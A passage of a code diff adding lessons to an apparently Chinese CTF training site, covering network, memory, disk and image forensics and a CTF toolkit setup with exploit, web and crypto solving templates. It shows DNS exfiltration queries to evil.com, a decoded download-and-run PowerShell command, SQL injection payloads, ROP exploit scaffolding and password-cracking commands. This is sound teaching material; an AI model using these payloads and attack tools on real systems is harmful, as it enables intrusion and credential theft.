查询中）\n$ tshark -r capture.pcap -Y \"dns\" -T fields \\\n  -e dns.qry.name | sort -u\naGVsbG8.evil.com\nd29ybGQ.evil.com\nZmxhZw.evil.com     ← Base64: \"flag\"\ne2Ruc190dW5uZWx9.evil.com  ← Base64: \"{dns_tunnel}\"</code></pre></div>\n\n<div class=\"callout warn\"><div class=\"callout-title\">DNS 隧道检测</div><p>很多 CTF 取证题会把 flag 藏在 DNS 查询的子域名中。子域名看起来像随机字符串，但实际上是 Base64 编码的数据。你需要提取所有 DNS 查询的子域名，拼接后解码。</p></div>\n\n<h3>TLS 流量解密</h3>\n\n<p>如果流量被 TLS 加密了怎么办？题目通常会提供解密密钥：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\"># 如果题目提供了 TLS 会话密钥文件 (sslkeys.log)\n# 在 Wireshark 中：\n# Edit -> Preferences -> Protocols -> TLS\n# 设置 \"(Pre)-Master-Secret log filename\" 为 sslkeys.log\n\n# 或者用 tshark 命令行解密\n$ tshark -r capture.pcap \\\n  -o \"tls.keylog_file:sslkeys.log\" \\\n  -Y \"http\" \\\n  -T fields -e http.file_data\n# 解密后的 HTTP 数据：\n# {\"message\":\"secret_data\",\"flag\":\"flag{tls_decryption_master}\"}\n\n# 如果没有密钥文件，但有服务器私钥：\n$ tshark -r capture.pcap \\\n  -o \"tls.key_file:server.key\" \\\n  -Y \"http2\" -T fields -e http2.headers.value</code></pre></div>\n\n<div class=\"checkpoint\" data-cp=\"1\"></div>\n\n<h2>场景三：内存取证</h2>\n\n<p>内存取证是取证方向中最有挑战性的。题目给你一个内存镜像（通常几百 MB 到几 GB），你需要从中提取进程信息、网络连接、文件内容等。</p>\n\n<h3>Volatility 3 —— 内存取证的核心工具</h3>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\"># 安装 Volatility 3\n$ pip3 install volatility3\n\n# 第一步：识别镜像的操作系统和版本\n$ vol -f memory.dmp windows.info\nVolatility 3 Framework 2.5.0\nVariable        Value\n--------        -----\nKernel Base     0xf803`56000000\nDTB             0x1ad000\nSymbols         ntkrnlmp.pdb\nVersion         Windows 10 x64 (Build 19041)\n\n# 查看进程列表\n$ vol -f memory.dmp windows.pslist\nPID    PPID   ImageFileName    Offset(V)       Threads  CreateTime\n----   ----   -------------    ---------       -------  ----------\n4      0      System           0xffffa803...   156      2024-01-15 08:00:00\n612    4      smss.exe         0xffffa803...   2        2024-01-15 08:00:01\n720    612    csrss.exe        0xffffa803...   12       2024-01-15 08:00:02\n3156   2840   notepad.exe      0xffffa803...   4        2024-01-15 10:23:45\n4210   2840   cmd.exe          0xffffa803...   1        2024-01-15 10:30:00\n4523   4210   powershell.exe   0xffffa803...   11       2024-01-15 10:30:05\n5102   2840   chrome.exe       0xffffa803...   67       2024-01-15 09:15:30</code></pre></div>\n\n<p>看到了！有一个 <code>powershell.exe</code>（PID 4523）是从 <code>cmd.exe</code>（PID 4210）启动的。这在攻击场景中很常见。让我们深入检查。</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\"># 查看命令行历史\n$ vol -f memory.dmp windows.cmdline\nPID    Process  Args\n----   -------  ----\n4523   powershell.exe  powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA...\n\n# 这个 -enc 参数后面是 Base64 编码的 PowerShell 命令\n$ echo \"SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA\" | base64 -d | iconv -f UTF-16LE -t UTF-8\nIEX (New-Object...    ← 看起来像是下载执行恶意代码\n\n# 查看进程的网络连接\n$ vol -f memory.dmp windows.netscan\nOffset          Proto    LocalAddr        ForeignAddr      State    PID   Process\n------          -----    ---------        -----------      -----    ---   -------\n0xffffa803...   TCP      192.168.1.100:49876   45.33.32.156:443   ESTABLISHED  5102  chrome.exe\n0xffffa803...   TCP      192.168.1.100:52341   10.0.0.1:8080      ESTABLISHED  4523  powershell.exe  ← 可疑！\n\n# 提取可疑进程的内存\n$ vol -f memory.dmp windows.memmap --pid 4523 --dump\nVolatility 3 Framework 2.5.0\nDumping process 4523 (powershell.exe) memory...\nSaved to: pid.4523.dmp\n\n# 在进程内存中搜索 flag\n$ strings pid.4523.dmp | grep -i flag\nflag{memory_forensics_with_volatility}\nget_flag_from_memory\nCTF_flag_here</code></pre></div>\n\n<h3>提取剪贴板和文件</h3>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\"># 提取内存中的文件\n$ vol -f memory.dmp windows.filescan | grep -i \"flag\\|secret\\|password\"\n0xffffa803...  \\Users\\ctf\\Desktop\\flag.txt    12\n0xffffa803...  \\Users\\ctf\\Documents\\secret.docx  8\n0xffffa803...  \\Users\\ctf\\Downloads\\passwords.txt  5\n\n# 导出找到的文件\n$ vol -f memory.dmp windows.dumpfiles --physaddr 0xffffa803...\n# 文件保存为: file.0xffffa803....dat\n\n# 查看文件内容\n$ cat file.0xffffa803....dat\nflag{file_extraction_from_memory}</code></pre></div>\n\n<h2>场景四：磁盘镜像取证</h2>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\"># 检查磁盘镜像类型\n$ file disk.img\ndisk.img: DOS/MBR boot sector; partition 1 : ID=0x83, start-CHS\n          (0x0,32,33), end-CHS (0x3ff,254,63), startsector 2048\n\n# 使用 Autopsy 图形化工具分析（推荐）\n$ autopsy &\n# 1. 新建案件\n# 2. 添加数据源 -> 选择 disk.img\n# 3. Autopsy 会自动解析文件系统、提取文件、分析时间线\n\n# 或者用命令行工具\n# 挂载磁盘镜像\n$ mkdir /mnt/evidence\n$ mount -o loop,ro disk.img /mnt/evidence\n\n# 查看文件系统结构\n$ ls -la /mnt/evidence/\ntotal 48\ndrwxr-xr-x  5 root root  4096 Jan 15 08:00 .\ndrwxr-xr-x  3 root root  4096 Jan 15 08:00 home\ndrwxr-xr-x  2 root root  4096 Jan 15 08:00 etc\ndrwxr-xr-x  2 root root  4096 Jan 15 08:00 var\n\n# 搜索 flag 文件\n$ find /mnt/evidence -name \"*flag*\" -o -name \"*secret*\"\n/mnt/evidence/home/ctf/flag.txt\n/mnt/evidence/home/ctf/.hidden/secret.txt\n\n# 查看隐藏目录\n$ cat /mnt/evidence/home/ctf/.hidden/secret.txt\nflag{disk_image_forensics_complete}</code></pre></div>\n\n<div class=\"checkpoint\" data-cp=\"2\"></div>\n\n<h2>图片隐写分析</h2>\n\n<p>图片隐写是 CTF Misc 题的经典考点。flag 可能藏在图片的 LSB（最低有效位）、EXIF 元数据、或附加数据中。</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\"># 第一步：检查元数据\n$ exiftool suspicious.png\nExifTool Version Number: 12.70\nFile Name: suspicious.png\nFile Size: 45 kB\nComment: hint: check the LSB    ← 元数据中有提示！\n\n# 第二步：检查是否嵌入了其他文件\n$ binwalk suspicious.png\nDECIMAL    HEXADECIMAL  DESCRIPTION\n0          0x0          PNG image, 512 x 512\n12345      0x3039       Zip archive data\n\n# 第三步：LSB 隐写分析\n$ python3 -c \"\nfrom PIL import Image\nimport sys\n\nimg = Image.open('suspicious.png')\npixels = list(img.getdata())\nwidth, height = img.size\n\n# 提取红色通道的 LSB\nbits = ''\nfor pixel in pixels[:800]:  # 只看前 800 个像素\n    r = pixel[0]\n    bits += str(r & 1)\n\n# 每 8 位转换为一个字节\nresult = ''\nfor i in range(0, len(bits), 8):\n    byte = bits[i:i+8]\n    if len(byte) == 8:\n        char = chr(int(byte, 2))\n        if char.isprintable():\n            result += char\n        else:\n            break\n\nprint(f'LSB 提取结果: {result}')\n\"\n# 输出: LSB 提取结果: flag{lsb_steganography_hidden}</code></pre></div>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\"># 使用 Stegsolve 进行可视化分析\n$ java -jar Stegsolve.jar suspicious.png\n# Stegsolve 可以逐位查看图片的各个颜色通道\n# 尝试：Red plane 0, Green plane 0, Blue plane 0\n# 如果 LSB 中藏有信息，会在某个通道中显示出来\n\n# 使用 steghide（针对 JPEG 图片）\n$ steghide extract -sf photo.jpg -p \"password\"\n# 或者暴力破解密码\n$ stegcracker photo.jpg /usr/share/wordlists/rockyou.txt\n\n# 检查是否有附加数据（文件末尾）\n$ xxd suspicious.png | tail -5\n# 如果文件末尾有多余数据，可能是嵌入的文件</code></pre></div>\n\n<div class=\"callout default\"><div class=\"callout-title\">图片隐写检查清单</div><p>拿到一张图片时，按这个顺序检查：1. <code>exiftool</code> 查看元数据；2. <code>binwalk</code> 检测嵌入文件；3. <code>strings</code> 搜索明文；4. <code>Stegsolve</code> 位平面分析；5. <code>steghide/stegcracker</code> 提取隐藏数据；6. LSB 手动提取。</p></div>\n\n<h2>取证工具速查表</h2>\n\n<table>\n<tr><th>工具</th><th>用途</th><th>常用命令</th></tr>\n<tr><td>binwalk</td><td>文件分析和提取</td><td><code>binwalk -eM file.bin</code></td></tr>\n<tr><td>foremost/scalpel</td><td>文件雕刻</td><td><code>foremost -i disk.img</code></td></tr>\n<tr><td>tshark/wireshark</td><td>流量分析</td><td><code>tshark -r cap.pcap -Y \"filter\"</code></td></tr>\n<tr><td>volatility3</td><td>内存取证</td><td><code>vol -f mem.dmp windows.pslist</code></td></tr>\n<tr><td>autopsy</td><td>磁盘取证</td><td>图形化分析</td></tr>\n<tr><td>exiftool</td><td>元数据提取</td><td><code>exiftool image.png</code></td></tr>\n<tr><td>stegsolve</td><td>图片隐写分析</td><td>位平面可视化</td></tr>\n<tr><td>photorec</td><td>删除文件恢复</td><td><code>photorec disk.img</code></td></tr>\n</table>\n\n<button class=\"practice-link-btn\" onclick=\"navigate('ctf'); openCTF(9)\">▶ 挑战：binwalk 文件提取</button>\n<button class=\"practice-link-btn\" onclick=\"navigate('ctf'); openCTF(10)\">▶ 挑战：流量分析大师</button>\n<button class=\"practice-link-btn\" onclick=\"navigate('ctf'); openCTF(11)\">▶ 挑战：内存取证入门</button>";
+
+SECTION_CONTENT["ctfg-06-01"] = "<h1>CTF 武器库配置指南</h1>\n\n<p>工欲善其事，必先利其器。一个配置完善的 CTF 环境能让你在比赛中事半功倍——不用浪费宝贵的时间在安装工具上。这一节，我们手把手帮你搭建一个完整的 CTF 武器库。</p>\n\n<h2>基础环境搭建</h2>\n\n<h3>选择操作系统</h3>\n\n<p>CTF 的最佳操作系统是 Linux。你有三个选择：</p>\n\n<table>\n<tr><th>方案</th><th>优点</th><th>缺点</th><th>推荐度</th></tr>\n<tr><td>Kali Linux 虚拟机</td><td>预装大量安全工具</td><td>占用资源较大</td><td>新手首选</td></tr>\n<tr><td>Ubuntu + 手动安装</td><td>稳定、轻量</td><td>需要自己装工具</td><td>进阶选手</td></tr>\n<tr><td>WSL2 (Windows)</td><td>不影响 Windows 日常使用</td><td>某些工具兼容性一般</td><td>Windows 用户</td></tr>\n</table>\n\n<h3>Kali Linux 安装与初始化</h3>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\"># 使用 VirtualBox 或 VMware 安装 Kali Linux\n# 下载地址：https://www.kali.org/get-kali/\n# 推荐使用预构建的虚拟机镜像\n\n# 安装后首先更新系统\n$ sudo apt update && sudo apt upgrade -y\n\n# 安装 Kali 的完整工具集（如果选择了最小安装）\n$ sudo apt install -y kali-linux-large\n\n# 设置中文支持（可选但推荐）\n$ sudo apt install -y fonts-wqy-microhei ibus-pinyin\n$ sudo dpkg-reconfigure locales\n# 选择 zh_CN.UTF-8</code></pre></div>\n\n<h2>Python 环境 —— CTF 的核心</h2>\n\n<p>Python 是 CTF 选手的\"母语\"。几乎所有解题脚本都用 Python 写。以下是必装的 Python 包：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\"># 确保 Python 3.10+\n$ python3 --version\nPython 3.11.6\n\n# 安装 pip（如果没有）\n$ sudo apt install -y python3-pip python3-venv\n\n# 创建 CTF 专用虚拟环境（推荐）\n$ python3 -m venv ~/ctf-env\n$ source ~/ctf-env/bin/activate\n\n# ===== 必装包列表 =====\n\n# pwntools - PWN 方向的核心库\n$ pip install pwntools\n\n# pycryptodome - 密码学工具\n$ pip install pycryptodome\n\n# gmpy2 - 大数运算\n$ pip install gmpy2\n\n# sympy - 符号计算（数论、因式分解）\n$ pip install sympy\n\n# requests - HTTP 请求\n$ pip install requests\n\n# beautifulsoup4 - HTML 解析\n$ pip install beautifulsoup4\n\n# Pillow - 图片处理\n$ pip install Pillow\n\n# numpy - 数据处理\n$ pip install numpy\n\n# z3-solver - 约束求解器（逆向/Crypto 常用）\n$ pip install z3-solver\n\n# libnum - 数字和字符串转换\n$ pip install libnum\n\n# 一键安装所有核心包\n$ pip install pwntools pycryptodome gmpy2 sympy requests \\\n  beautifulsoup4 Pillow numpy z3-solver libnum factordb-pyclient</code></pre></div>\n\n<h2>pwntools 深度配置</h2>\n\n<p>pwntools 是 PWN 方向的灵魂工具。除了基本安装，你还需要配置以下内容：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\"># 安装 pwntools 的依赖\n$ sudo apt install -y libssl-dev libffi-dev python3-dev \\\n  build-essential gcc-multilib\n\n# 安装 32 位运行库（做 32 位 PWN 题时需要）\n$ sudo dpkg --add-architecture i386\n$ sudo apt update\n$ sudo apt install -y libc6:i386 libstdc++6:i386\n\n# 验证 pwntools 安装\n$ python3 -c \"from pwn import *; print('pwntools OK:', pwnlib.version)\"\n# 输出: pwntools OK: 4.12.0</code></pre></div>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-python\"># pwntools 速查 —— 常用功能\n\nfrom pwn import *\n\n# ===== 连接方式 =====\np = process('./vuln')                    # 本地进程\np = remote('target.com', 1337)           # 远程连接\np = ssh('user', 'target.com', password='pass')  # SSH\n\n# ===== 数据接收 =====\ndata = p.recv(1024)          # 接收 1024 字节\ndata = p.recvline()          # 接收一行\ndata = p.recvuntil(b'>>>')   # 接收到指定字符串\ndata = p.recvall()           # 接收所有（直到 EOF）\n\n# ===== 数据发送 =====\np.send(b'hello')             # 发送数据\np.sendline(b'hello')         # 发送一行（自动加换行符）\np.sendafter(b'input:', payload)  # 等到提示后发送\n\n# ===== 数据类型转换 =====\np32(0xdeadbeef)              # 32位小端序打包\np64(0xdeadbeef)              # 64位小端序打包\nu32(b'\\xef\\xbe\\xad\\xde')    # 32位小端序解包\nu64(b'\\xef\\xbe\\xad\\xde\\x00\\x00\\x00\\x00')  # 64位\n\n# ===== ELF 操作 =====\nelf = ELF('./vuln')\nelf.sym['main']              # 函数地址\nelf.got['puts']              # GOT 表地址\nelf.plt['puts']              # PLT 地址\nelf.search(b'/bin/sh')       # 搜索字符串\n\n# ===== ROP 链 =====\nrop = ROP(elf)\nrop.call('puts', [elf.got['puts']])\nrop.call('main')\npayload = b'A' * offset + rop.chain()\n\n# ===== 交互模式 =====\np.interactive()              # 进入交互模式（手动操作 shell）</code></pre></div>\n\n<div class=\"checkpoint\" data-cp=\"0\"></div>\n\n<h2>GDB 调试环境配置</h2>\n\n<p>原生 GDB 很朴素，但加上插件后就变成了神器。以下是主流的 GDB 增强插件：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\"># 推荐：pwndbg（pwntools 配套）\n$ git clone https://github.com/pwndbg/pwndbg\n$ cd pwndbg && ./setup.sh\n\n# 备选：GEF (GDB Enhanced Features)\n$ bash -c \"$(curl -fsSL https://gef.blah.cat/sh)\"\n\n# 备选：peda（轻量级）\n$ git clone https://github.com/longld/peda.git ~/peda\n$ echo \"source ~/peda/peda.py\" >> ~/.gdbinit\n\n# ===== 验证安装 =====\n$ gdb -q /bin/ls\n# 如果看到彩色输出和增强的提示符，说明安装成功\n\n# ===== pwndbg/GEF 常用命令 =====\n# 断点\npwndbg> break *0x401234         # 地址断点\npwndbg> break main              # 函数断点\npwndbg> break *main+42          # 偏移断点\n\n# 运行\npwndbg> run \"AAAA\"              # 带参数运行\npwndbg> run &lt; input.txt         # 从文件读取输入\n\n# 内存查看\npwndbg> x/20gx $rsp             # 查看栈内容（20个8字节）\npwndbg> x/s $rdi                # 查看字符串\npwndbg> x/10i $rip              # 查看接下来的10条指令\n\n# 单步执行\npwndbg> stepi                   # 单步执行一条指令\npwndbg> nexti                   # 单步执行（跳过函数调用）\npwndbg> continue                # 继续运行到下一个断点\n\n# 搜索内存\npwndbg> search -t bytes b'flag'  # 搜索 \"flag\" 字符串\npwndbg> vmmap                    # 查看内存映射\n\n# ROP 链查找\npwndbg> rop --grep \"pop rdi\"     # 搜索 ROP gadget</code></pre></div>\n\n<h2>逆向工具链</h2>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\"># ===== Ghidra（免费，功能强大）=====\n# 下载地址：https://ghidra-sre.org/\n$ wget https://github.com/NationalSecurityAgency/ghidra/releases/download/Ghidra_11.0_build/ghidra_11.0_PUBLIC_20240101.zip\n$ unzip ghidra_11.0_PUBLIC_20240101.zip\n$ cd ghidra_11.0_PUBLIC && ./ghidraRun\n\n# 需要 Java 17+\n$ sudo apt install -y openjdk-17-jdk\n\n# ===== IDA Free（免费版，功能够用）=====\n# 下载：https://hex-rays.com/ida-free/\n# 需要注册账号\n\n# ===== 辅助逆向工具 =====\n$ sudo apt install -y radare2   # 命令行逆向框架\n$ pip install angr              # 符号执行框架\n$ pip install unicorn           # CPU 模拟器\n$ sudo apt install -y ltrace strace  # 动态跟踪\n\n# ===== radare2 速查 =====\n$ r2 -A crackme01              # 分析并打开文件\n[0x00401000]> afl               # 列出所有函数\n[0x00401000]> s main            # 跳转到 main\n[0x00401000]> pdf               # 反汇编当前函数\n[0x00401000]> px 64 @ 0x403000  # 查看内存数据\n[0x00401000]> iz                # 列出所有字符串\n[0x00401000]> axt @ 0x403000    # 查看交叉引用</code></pre></div>\n\n<h2>Web 安全工具链</h2>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\"># ===== Burp Suite Community（免费版够用）=====\n# Kali 预装，或下载：https://portswigger.net/burp/communitydownload\n\n# ===== SQL 注入 =====\n$ sudo apt install -y sqlmap\n$ sqlmap -u \"http://target/page?id=1\" --batch --dbs\n\n# ===== 目录扫描 =====\n$ sudo apt install -y dirb gobuster\n$ gobuster dir -u http://target -w /usr/share/wordlists/dirb/common.txt -t 50\n\n# ===== Web Fuzzer =====\n$ sudo apt install -y ffuf\n$ ffuf -u http://target/FUZZ -w wordlist.txt -mc 200,302\n\n# ===== JWT 工具 =====\n$ git clone https://github.com/ticarpi/jwt_tool\n$ cd jwt_tool && pip install -r requirements.txt\n$ python3 jwt_tool.py eyJhbGc... -M at    # 自动攻击模式\n\n# ===== XXE / SSTI / 反序列化工具 =====\n$ sudo apt install -y ysoserial  # Java 反序列化 payload 生成\n# 下载：https://github.com/frohoff/ysoserial\n\n# ===== curl 高级用法 =====\n# 发送 POST 请求带 JSON\n$ curl -X POST http://target/api -H \"Content-Type: application/json\" \\\n  -d '{\"username\":\"admin\",\"password\":\"test\"}'\n\n# 带 Cookie\n$ curl http://target/admin -b \"session=abc123\"\n\n# 带自定义 Header\n$ curl http://target/api -H \"X-Forwarded-For: 127.0.0.1\"</code></pre></div>\n\n<h2>取证工具链</h2>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\"># ===== 文件分析 =====\n$ sudo apt install -y binwalk foremost sleuthkit\n$ pip install volatility3\n\n# ===== 网络分析 =====\n$ sudo apt install -y wireshark tshark tcpdump\n$ sudo apt install -y networkminer  # 如果有包的话\n\n# ===== 图片隐写 =====\n$ sudo apt install -y steghide exiftool\n$ pip install stegoveritas\n# Stegsolve: 下载 jar 文件\n$ wget http://www.caesum.com/handbook/Stegsolve.jar\n\n# ===== 音频隐写 =====\n$ sudo apt install -y sox audacity\n# Sonic Visualiser（频谱分析）\n# https://www.sonicvisualiser.org/\n\n# ===== 密码破解 =====\n$ sudo apt install -y hashcat john\n$ sudo apt install -y hydra        # 在线密码爆破\n\n# ===== hashcat 使用示例 =====\n# 破解 MD5 哈希\n$ hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt\n# 破解 SHA256\n$ hashcat -m 1400 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt\n\n# ===== john the ripper =====\n$ john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt\n$ john --show hashes.txt           # 查看已破解的结果</code></pre></div>\n\n<div class=\"checkpoint\" data-cp=\"1\"></div>\n\n<h2>实战模板脚本</h2>\n\n<p>以下是几个常用的 CTF 解题模板，保存到本地，比赛时直接修改使用：</p>\n\n<h3>PWN 通用模板</h3>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-python\">#!/usr/bin/env python3\n\"\"\"PWN 通用 exploit 模板\"\"\"\n\nfrom pwn import *\n\n# ===== 配置 =====\ncontext.log_level = 'info'\ncontext.arch = 'amd64'  # 或 'i386'\ncontext.os = 'linux'\n\n# 目标文件和远程服务\nBINARY = './vuln'\nHOST = 'challenge.example.com'\nPORT = 1337\n\n# ===== 加载 ELF =====\nelf = ELF(BINARY)\n# libc = ELF('./libc.so.6')  # 如果有 libc\n\n# ===== 辅助函数 =====\ndef start(argv=[]):\n    if args.REMOTE:\n        return remote(HOST, PORT)\n    else:\n        return process(BINARY, argv=argv)\n\n# ===== 找到偏移量 =====\n# 使用 cyclic 模式：\n# offset = cyclic_find(0x6161616c)  # 替换为崩溃时的 RIP 值\n\n# 或者从汇编分析：\noffset = 88  # buf_size + saved_rbp\n\n# ===== Exploit =====\ndef exploit():\n    p = start()\n\n    # 阶段 1：信息泄露（如果需要）\n    # ...\n\n    # 阶段 2：构造 payload\n    payload = b'A' * offset\n\n    # 简单的 ret2win\n    # payload += p64(elf.sym['win'])\n\n    # Ret2libc\n    # pop_rdi = 0x4012a3\n    # ret = 0x40101a\n    # payload += p64(pop_rdi) + p64(elf.got['puts']) + p64(elf.plt['puts'])\n    # payload += p64(elf.sym['main'])\n\n    # 发送 payload\n    p.sendlineafter(b'> ', payload)\n\n    # 获取交互 shell\n    p.interactive()\n\nif __name__ == '__main__':\n    exploit()</code></pre></div>\n\n<h3>Web 解题模板</h3>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-python\">#!/usr/bin/env python3\n\"\"\"Web 解题通用模板\"\"\"\n\nimport requests\nimport re\nfrom urllib.parse import urljoin\n\n# ===== 配置 =====\nBASE_URL = \"http://challenge.example.com:8080\"\nsession = requests.Session()\n\n# ===== 辅助函数 =====\ndef get(path, **kwargs):\n    url = urljoin(BASE_URL, path)\n    resp = session.get(url, **kwargs)\n    print(f\"[GET] {path} -> {resp.status_code}\")\n    return resp\n\ndef post(path, data=None, json=None, **kwargs):\n    url = urljoin(BASE_URL, path)\n    resp = session.post(url, data=data, json=json, **kwargs)\n    print(f\"[POST] {path} -> {resp.status_code}\")\n    return resp\n\n# ===== 信息收集 =====\nprint(\"=== 信息收集 ===\")\n# 首页\nresp = get(\"/\")\nprint(f\"Server: {resp.headers.get('Server')}\")\nprint(f\"X-Powered-By: {resp.headers.get('X-Powered-By')}\")\n\n# 测试常见路径\nfor path in [\"/admin\", \"/api\", \"/robots.txt\", \"/.git/HEAD\",\n             \"/flag\", \"/flag.txt\", \"/backup\"]:\n    resp = get(path)\n    if resp.status_code != 404:\n        print(f\"  [+] {path}: {resp.status_code}\")\n        if len(resp.text) < 200:\n            print(f\"      {resp.text[:200]}\")\n\n# ===== SQL 注入测试 =====\nprint(\"\\n=== SQL 注入测试 ===\")\ntest_inputs = [\n    \"' OR '1'='1\",\n    \"' UNION SELECT 1,2,3--\",\n    \"admin' --\",\n    \"' OR 1=1#\",\n]\n\nfor payload in test_inputs:\n    resp = get(f\"/search?q={payload}\")\n    if \"error\" in resp.text.lower() or \"sql\" in resp.text.lower():\n        print(f\"  [+] 可能的注入: {payload}\")\n        print(f\"      响应: {resp.text[:200]}\")</code></pre></div>\n\n<h3>Crypto 解题模板</h3>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-python\">#!/usr/bin/env python3\n\"\"\"Crypto 解题通用模板\"\"\"\n\nimport base64\nimport binascii\nfrom Crypto.Cipher import AES, DES\nfrom Crypto.Util.number import *\nimport gmpy2\nimport string\n\n# ===== 编码转换 =====\ndef decode_all(data):\n    \"\"\"尝试所有常见编码\"\"\"\n    results = {}\n\n    # Base64\n    try:\n        results['base64'] = base64.b64decode(data).decode()\n    except: pass\n\n    # Base32\n    try:\n        results['base32'] = base64.b32decode(data).decode()\n    except: pass\n\n    # Hex\n    try:\n        results['hex'] = bytes.fromhex(data).decode()\n    except: pass\n\n    # ROT13\n    import codecs\n    results['rot13'] = codecs.decode(data, 'rot_13')\n\n    for name, result in results.items():\n        print(f\"  {name}: {result}\")\n    return results\n\n# ===== XOR 相关 =====\ndef xor_bytes(data, key):\n    \"\"\"XOR 解密\"\"\"\n    if isinstance(key, int):\n        return bytes([b ^ key for b in data])\n    else:\n        return bytes([data[i] ^ key[i % len(key)] for i in range(len(data))])\n\ndef xor_bruteforce(ciphertext, known_prefix=b\"flag{\"):\n    \"\"\"XOR 单字节密钥暴力破解\"\"\"\n    for key in range(256):\n        decrypted = xor_bytes(ciphertext, key)\n        if decrypted[:len(known_prefix)] == known_prefix:\n            print(f\"[+] Key: {hex(key)}, Plaintext: {decrypted}\")\n            return decrypted\n    return None\n\n# ===== RSA 工具 =====\ndef rsa_decrypt(n, e, d, c):\n    \"\"\"RSA 基本解密\"\"\"\n    m = pow(c, d, n)\n    return long_to_bytes(m)\n\ndef rsa_factor_attack(n, e, c):\n    \"\"\"当 n 可以分解时\"\"\"\n    from sympy import factorint\n    factors = factorint(n)\n    primes = list(factors.keys())\n    if len(primes) == 2:\n        p, q = primes\n        phi = (p - 1) * (q - 1)\n        d = pow(e, -1, phi)\n        m = pow(c, d, n)\n        print(f\"[+] p = {p}\")\n        print(f\"[+] q = {q}\")\n        print(f\"[+] d = {d}\")\n        return long_to_bytes(m)\n    return None</code></pre></div>\n\n<div class=\"checkpoint\" data-cp=\"2\"></div>\n\n<h2>比赛日 Checklist</h2>\n\n<p>比赛前的准备工作同样重要。用这个 checklist 确保万无一失：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-text\">===== CTF 比赛日检查清单 =====\n\n环境准备：\n[ ] Kali Linux / Ubuntu 环境就绪\n[ ] Python 3 + 所有必要包已安装\n[ ] pwntools 验证可用\n[ ] GDB + pwndbg 验证可用\n[ ] Ghidra 验证可启动\n[ ] Wireshark 验证可用\n[ ] Burp Suite 验证可启动\n[ ] 网络连接正常（有些比赛需要 VPN）\n\n工具验证：\n[ ] curl/wget 可用\n[ ] nc (netcat) 可用\n[ ] strings/file/xxd 可用\n[ ] binwalk/foremost 可用\n[ ] sqlmap 可用\n[ ] hashcat/john 可用\n[ ] volatility3 可用\n\n资料准备：\n[ ] 字典文件已下载 (rockyou.txt, SecLists)\n[ ] 常用脚本模板已准备好\n[ ] CyberChef 书签已保存\n[ ] CTFtime 账号已登录\n[ ] 队友联系方式确认\n\n比赛中：\n[ ] 快速浏览所有题目\n[ ] 先做简单题\n[ ] 记录每道题的进展\n[ ] 定期和队友同步\n[ ] 注意提交 flag 的格式</code></pre></div>\n\n<h2>持续学习资源</h2>\n\n<p>CTF 技能需要持续练习。以下是推荐的学习路径：</p>\n\n<table>\n<tr><th>阶段</th><th>推荐平台</th><th>目标</th></tr>\n<tr><td>入门（0-3 月）</td><td>PicoCTF, BUUCTF 简单题</td><td>熟悉各题型，能独立解决简单题</td></tr>\n<tr><td>基础（3-6 月）</td><td>CTFHub, 攻防世界</td><td>确定主攻方向，系统学习</td></tr>\n<tr><td>进阶（6-12 月）</td><td>HackTheBox, pwnable.kr</td><td>能解决中等难度题</td></tr>\n<tr><td>竞赛（12 月+）</td><td>参加线上/线下 CTF 比赛</td><td>组队参赛，积累实战经验</td></tr>\n</table>\n\n<div class=\"callout info\"><div class=\"callout-title\">推荐社区</div><p>加入 CTF 社区能加速你的成长：CTFtime.org（赛事日历和排名）、各平台 Discord/QQ 群（交流解题思路）、GitHub 上的 CTF Writeup 仓库（学习高手的解法）。记住：看 writeup 不是作弊，是最好的学习方式。</p></div>\n\n<h2>本章小结</h2>\n\n<p>到这里，你已经拥有了完整的 CTF 武器库和学习路线图。回顾一下本模块的内容：</p>\n\n<ol>\n<li><strong>CTF 入门</strong>：了解了 CTF 的五大题型和解题方法论</li>\n<li><strong>PWN 二进制</strong>：从栈溢出到 Ret2libc，掌握了二进制利用的基础</li>\n<li><strong>逆向工程</strong>：用 Ghidra 完成了从简单到复杂的逆向分析</li>\n<li><strong>Web & Crypto</strong>：掌握了 SQL 注入、命令注入、RSA 等核心考点</li>\n<li><strong>数字取证</strong>：学会了文件分析、流量分析、内存取证的核心技能</li>\n<li><strong>工具链配置</strong>：搭建了完整的 CTF 开发环境</li>\n</ol>\n\n<p>CTF 是一场马拉松，不是短跑。保持好奇心，多做题，多交流。祝你在竞技场中旗开得胜！</p>\n\n<div class=\"callout success\"><div class=\"callout-title\">恭喜完成 CTF 实战模块</div><p>你已经掌握了 CTF 的核心技能和工具链。现在是时候去各大平台实战了。记住：每道题都是一次学习机会，即使做不出来，看 writeup 也能学到很多新技巧。加油！</p></div>\n\n<button class=\"practice-link-btn\" onclick=\"navigate('ctf'); openCTF(12)\">▶ 挑战：综合 CTF 